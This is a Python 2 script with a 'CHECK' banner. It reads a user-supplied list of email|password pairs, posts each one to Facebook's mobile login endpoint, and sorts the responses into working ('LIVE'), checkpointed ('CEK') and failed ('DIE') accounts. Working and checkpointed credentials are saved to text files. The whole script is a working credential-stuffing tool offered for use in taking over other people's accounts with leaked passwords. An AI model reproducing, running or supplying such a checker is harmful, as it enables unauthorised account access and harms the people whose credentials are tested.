#!/usr/bin/python2
# coding=utf-8

import os, requests, sys

HEADER = '\033[95m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[1;92m'
CYAN = '\033[96m'
RESET = '\033[1;97m'

live = open('live.txt', 'w')
ch = open('ch.txt', 'w')

logo = ('''
\033[1;96m ██████\033[1;97m╗\033[1;96m██\033[1;97m╗  \033[1;96m██\033[1;97m╗\033[1;96m███████\033[1;97m╗ \033[1;96m██████\033[1;97m╗\033[1;96m██\033[1;97m╗  \033[1;96m██\033[1;97m╗
\033[1;96m██\033[1;97m╔════╝\033[1;96m██\033[1;97m║  \033[1;96m██\033[1;97m║\033[1;96m██\033[1;97m╔════╝\033[1;96m██\033[1;97m╔════╝\033[1;96m██\033[1;97m║ \033[1;96m██\033[1;97m╔╝
\033[1;96m██\033[1;97m║     \033[1;96m███████\033[1;97m║\033[1;96m█████\033[1;97m╗  \033[1;96m██\033[1;97m║     \033[1;96m█████\033[1;97m╔╝ 
\033[1;96m██\033[1;97m║     \033[1;96m██\033[1;97m╔══\033[1;96m██\033[1;97m║\033[1;96m██\033[1;97m╔══╝  \033[1;96m██\033[1;97m║     \033[1;96m██\033[1;97m╔═\033[1;96m██\033[1;97m╗ 
\033[1;97m╚\033[1;96m██████\033[1;97m╗\033[1;96m██\033[1;97m║  \033[1;96m██\033[1;97m║\033[1;96m███████\033[1;97m╗╚\033[1;96m██████\033[1;97m╗\033[1;96m██\033[1;97m║  \033[1;96m██\033[1;97m╗
\033[1;97m ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
''')

os.system('clear')
print logo


empas = raw_input('\033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m Input your list : ')
print ("\nStarted Checking...\n")

link = 'https://mobile.facebook.com/login.php'
headers = {
'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
'Accept-Language' : 'en-US,en;q=0.5'
}
empas = open(empas, 'r').readlines()

for list in empas:
    me = list.strip().split('|')

    data = {
    'email': me[0],
    'pass': me[1]
    }
    shot = requests.post(link, headers=headers, data=data).text

    if "xc_message" in shot:
        print (GREEN+"[LIVE] "+RESET+ me[0] +"|"+me[1])
        live.write('[LIVE] ' + me[0] + ' | ' + me[1] + '\n')
    elif "checkpointSubmitButton-actual-button" in shot:
        print (YELLOW+"[CEK] "+YELLOW+ me[0] +"|"+me[1])
        ch.write('[CEK] ' + me[0] + ' | ' + me[1] + '\n')
    elif "login_error" in shot:
        print (RED+"[DIE] "+RED+ me[0] +"|"+me[1])
    else:
        print (RED+"[DIE] "+RED+ me[0] +"|"+me[1])

print ("\n\033[1;97mSelesai...")
